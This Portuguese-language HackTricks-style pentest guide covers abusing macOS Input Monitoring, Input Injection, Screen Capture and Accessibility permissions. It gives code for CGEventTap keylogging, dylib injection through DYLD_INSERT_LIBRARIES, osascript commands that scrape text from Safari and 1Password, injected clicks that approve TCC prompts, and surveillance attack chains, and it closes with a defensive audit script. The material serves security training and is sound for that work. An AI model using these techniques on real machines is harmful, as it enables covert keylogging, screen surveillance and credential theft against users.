# Abuso de Input Monitoring, Screen Capture e Accessibility no macOS

{{#include ../../../banners/hacktricks-training.md}}

## Visão geral

Três serviços TCC relacionados controlam como os aplicativos podem observar e interagir com a sessão da área de trabalho do usuário:

| Serviço TCC | Permissão | Capacidade |
|---|---|---|
| `kTCCServiceListenEvent` | **Input Monitoring** | Ler todos os eventos de teclado e mouse em todo o sistema (keylogging) |
| `kTCCServicePostEvent` | **Input Injection** | Injetar eventos sintéticos de teclado e mouse |
| `kTCCServiceScreenCapture` | **Screen Capture** | Ler o buffer da tela, tirar screenshots e gravar a tela |
| `kTCCServiceAccessibility` | **Accessibility** | Controlar outros aplicativos por meio da API AXUIElement e ler elementos da interface |

Essas permissões são **a combinação mais perigosa no macOS** — juntas, elas fornecem:
- Keylogging completo de cada tecla pressionada (senhas, mensagens, cartões de crédito)
- Gravação da tela de todo o conteúdo visível
- Injeção de entrada sintética (clicar em botões, aprovar diálogos)
- Controle completo da GUI, equivalente ao acesso físico

---

## Input Monitoring (kTCCServiceListenEvent)

### Como funciona

O macOS usa a API **`CGEventTap`** para permitir que processos interceptem eventos de entrada do sistema de eventos Quartz. Um processo com a permissão ListenEvent pode criar um event tap que recebe **cada evento de teclado e mouse** antes ou depois de chegarem ao aplicativo-alvo.<sup>[[1]](#references)</sup>
```objc
// Create an event tap that captures all key-down events
CGEventMask mask = CGEventMaskBit(kCGEventKeyDown) | CGEventMaskBit(kCGEventFlagsChanged);

CFMachPortRef tap = CGEventTapCreate(
kCGSessionEventTap,        // Tap at the session level (all apps)
kCGHeadInsertEventTap,     // Insert before the event reaches the app
kCGEventTapOptionListenOnly, // Listen only (don't modify events)
mask,
eventCallback,             // Callback receives every matching event
NULL
);

// The callback receives every keyDown in the entire session:
CGEventRef eventCallback(CGEventTapProxy proxy, CGEventType type,
CGEventRef event, void *userInfo) {
UniChar chars[4];
UniCharCount len;
CGEventKeyboardGetUnicodeString(event, 4, &len, chars);
// chars now contains what the user typed
return event;
}
```
### Encontrando binários com entitlements
```bash
# Find processes with input monitoring TCC grants
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client, auth_value FROM access WHERE service='kTCCServiceListenEvent';"

# System-level grants
sudo sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client, auth_value FROM access WHERE service='kTCCServiceListenEvent';"
```
### Attack: Keylogging via Code Injection

Se um binário com a permissão ListenEvent também tiver **validação de bibliotecas desativada** ou **permitir variáveis de ambiente DYLD**, um atacante pode injetar uma dylib que registre um CGEventTap:
```bash
# Check if the target allows code injection
codesign -d --entitlements - /path/to/input-monitor-app 2>&1 | \
grep -E "allow-dyld|disable-library-validation"

# If both are present, inject a keylogger dylib:
DYLD_INSERT_LIBRARIES=/tmp/keylogger.dylib /path/to/input-monitor-app
```
A dylib injetada herda a concessão TCC ListenEvent do alvo e captura todas as teclas pressionadas.

### Ataque: Coleta de Credenciais

Um keylogger sofisticado pode correlacionar as teclas pressionadas com o aplicativo ativo:
```objc
// Get the frontmost application to contextualize keystrokes
NSRunningApplication *frontApp = [[NSWorkspace sharedWorkspace] frontmostApplication];
NSString *appName = frontApp.localizedName;

// If appName is "Safari" or "Chrome" and the URL bar contains a login page,
// the next typed sequence is likely a password
```
---

## Injeção de entrada (kTCCServicePostEvent)

### Como funciona

A permissão PostEvent permite criar um event tap com **`kCGEventTapOptionDefault`** (pode modificar/injetar eventos) em vez de ListenOnly.<sup>[[1]](#references)</sup> Isso permite:
```objc
// Inject a keystroke
CGEventRef keyDown = CGEventCreateKeyboardEvent(NULL, kVK_Return, true);
CGEventRef keyUp = CGEventCreateKeyboardEvent(NULL, kVK_Return, false);
CGEventPost(kCGSessionEventTap, keyDown);
CGEventPost(kCGSessionEventTap, keyUp);

// Inject a mouse click at coordinates
CGEventRef click = CGEventCreateMouseEvent(NULL, kCGEventLeftMouseDown,
CGPointMake(100, 200),
kCGMouseButtonLeft);
CGEventPost(kCGSessionEventTap, click);
```
### Ataque: Aprovação Automatizada de Prompts do TCC

Com PostEvent, um atacante pode **simular o clique em "Allow"** nas caixas de diálogo de permissões do TCC:
```bash
# Using cliclick (if available) or direct CGEvent injection:
# 1. Trigger a TCC prompt for the malware
# 2. Wait for the dialog to appear
# 3. Inject a mouse click on the "Allow" button coordinates
# 4. Malware now has the requested permission
```
---

## Captura de Tela (kTCCServiceScreenCapture)

### Como funciona

A permissão de captura de tela permite ler o buffer de exibição usando:
- **`CGWindowListCreateImage`** — captura qualquer janela ou a tela inteira
- **`ScreenCaptureKit`** (macOS 12.3+) — API moderna para transmitir o conteúdo da tela<sup>[[3]](#references)</sup>
- **`CGDisplayStream`** — captura de tela acelerada por hardware
```objc
// Capture the entire main display
CGImageRef screenshot = CGWindowListCreateImage(
CGRectInfinite,
kCGWindowListOptionOnScreenOnly,
kCGNullWindowID,
kCGWindowImageDefault
);
// screenshot contains everything visible on screen
```
### Identificando clientes de captura de tela
```bash
# TCC database query
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client, auth_value FROM access WHERE service='kTCCServiceScreenCapture';"

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT path FROM executables WHERE tccPermsStr LIKE '%kTCCServiceScreenCapture%';"
```
### Attack: Credential Capture via OCR

Um processo de captura de tela injetado pode capturar frames periodicamente e usar OCR para extrair senhas:
```bash
# Basic screen capture from a process with the TCC grant
screencapture -x /tmp/screen.png

# Capture a specific window (by window ID)
screencapture -x -l <windowID> /tmp/window.png
```
> [!WARNING]
> A partir do **macOS Sonoma**, a captura de tela exibe um **indicador persistente** na barra de menus. Nas versões anteriores, a gravação de tela podia ser completamente silenciosa. No entanto, uma breve captura de um único quadro ainda pode passar despercebida pelos usuários.

### Ataque: Session Recording

A gravação contínua da tela fornece uma reprodução completa da sessão do usuário:
```objc
// Using ScreenCaptureKit for streaming capture (macOS 12.3+)
// This captures frames continuously with minimal CPU impact
SCStreamConfiguration *config = [[SCStreamConfiguration alloc] init];
config.width = 1920;
config.height = 1080;
config.minimumFrameInterval = CMTimeMake(1, 5); // 5 FPS
// Stream captures everything: passwords, documents, private messages
```
---

## Accessibility (kTCCServiceAccessibility)

### Como funciona

O acesso de Accessibility concede controle sobre outros aplicativos por meio da **AXUIElement API**.<sup>[[2]](#references)</sup> Um processo com acesso de Accessibility pode:

1. **Ler** qualquer elemento da interface do usuário em qualquer aplicativo (campos de texto, rótulos, botões, menus)
2. **Clicar** em botões e interagir com controles
3. **Digitar** texto em qualquer campo de texto
4. **Navegar** por menus e caixas de diálogo
5. **Extrair** dados exibidos de qualquer aplicativo em execução
```objc
// Get the frontmost application
AXUIElementRef app = AXUIElementCreateApplication(pid);

// Get its windows
CFArrayRef windows;
AXUIElementCopyAttributeValue(app, kAXWindowsAttribute, (CFTypeRef *)&windows);

// Read a text field's value
AXUIElementRef textField = /* find the text field */;
CFTypeRef value;
AXUIElementCopyAttributeValue(textField, kAXValueAttribute, &value);
// value contains whatever text is displayed in the field
```
### Attack: Self-Granting TCC Permissions

O abuso mais perigoso da acessibilidade é **navegar pelas Configurações do Sistema para conceder ao seu próprio malware permissões adicionais**.<sup>[[4]](#references)</sup>
```bash
# Using osascript with accessibility access:
# Navigate to Privacy & Security > Full Disk Access
osascript -e '
tell application "System Settings"
activate
delay 1
end tell
tell application "System Events"
tell process "System Settings"
-- Navigate to Privacy & Security
-- Click the lock to authenticate
-- Toggle on Full Disk Access for the malware
end tell
end tell'
```
### Ataque: Cross-Application Data Scraping
```bash
# Read data from any application's UI
osascript -e 'tell application "System Events" to get value of text field 1 of window 1 of process "Safari"'

# Get all visible window titles
osascript -e 'tell application "System Events" to get name of every window of every process whose visible is true'

# Scrape password manager display (if unlocked and visible)
osascript -e 'tell application "System Events" to get value of every text field of window 1 of process "1Password"'
```
### Attack: Automated User Actions
```bash
# Click a specific UI element
osascript -e '
tell application "System Events"
tell process "Finder"
click button "Allow" of window 1
end tell
end tell'

# Type text into focused field
osascript -e 'tell application "System Events" to keystroke "malicious command"'
osascript -e 'tell application "System Events" to key code 36' -- Press Enter
```
---

## Cadeias de Ataque

### Cadeia: Input Monitoring + Screen Capture = Vigilância Completa
```
1. Inject into binary with ListenEvent + ScreenCapture
2. CGEventTap captures all keystrokes
3. Periodic screen captures provide visual context
4. Correlate: keystroke timing + active window + screen content
5. Result: passwords, private messages, financial data
```
### Cadeia: Accessibility + PostEvent = Controle Remoto Total
```
1. Inject into binary with Accessibility + PostEvent
2. Use AXUIElement to read current screen state
3. Use CGEventPost to inject keystrokes and clicks
4. Navigate System Settings to grant more permissions
5. Open Terminal, type commands as if the user did it
6. Result: equivalent to physical keyboard/mouse access
```
### Cadeia: Acessibilidade → Autoconcessão de acesso à câmera/microfone → Vigilância
```
1. Start with only Accessibility permission
2. Open System Settings > Privacy & Security > Camera
3. Use accessibility API to toggle camera access for malware
4. Repeat for Microphone, Screen Recording, Full Disk Access
5. Malware now has full surveillance capabilities
6. Result: one TCC permission escalates to total control
```
---

## Detecção e Enumeração
```bash
#!/bin/bash
echo "=== TCC Input/Screen/Accessibility Audit ==="

for db in "$HOME/Library/Application Support/com.apple.TCC/TCC.db" "/Library/Application Support/com.apple.TCC/TCC.db"; do
echo -e "\n[*] Database: $db"
for svc in kTCCServiceListenEvent kTCCServicePostEvent kTCCServiceScreenCapture kTCCServiceAccessibility; do
echo "  $svc:"
sqlite3 "$db" "SELECT '    ' || client || ' (auth=' || auth_value || ')' FROM access WHERE service='$svc' AND auth_value=2;" 2>/dev/null
done
done

echo -e "\n[*] Processes with injectable + input monitoring:"
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE tccPermsStr LIKE '%kTCCServiceListenEvent%'
AND (noLibVal=1 OR allowDyldEnv=1);" 2>/dev/null
```
## References

- [1] [Apple Developer — Event Taps](https://developer.apple.com/documentation/coregraphics/quartz_event_services)
- [2] [Apple Developer — API de acessibilidade](https://developer.apple.com/documentation/applicationservices/axuielement_h)
- [3] [Apple Developer — ScreenCaptureKit](https://developer.apple.com/documentation/screencapturekit)
- [4] [Objective-See — Eventos sintéticos e segurança da interface do usuário no macOS](https://objective-see.org/blog/blog_0x36.html)
{{#include ../../../banners/hacktricks-training.md}}
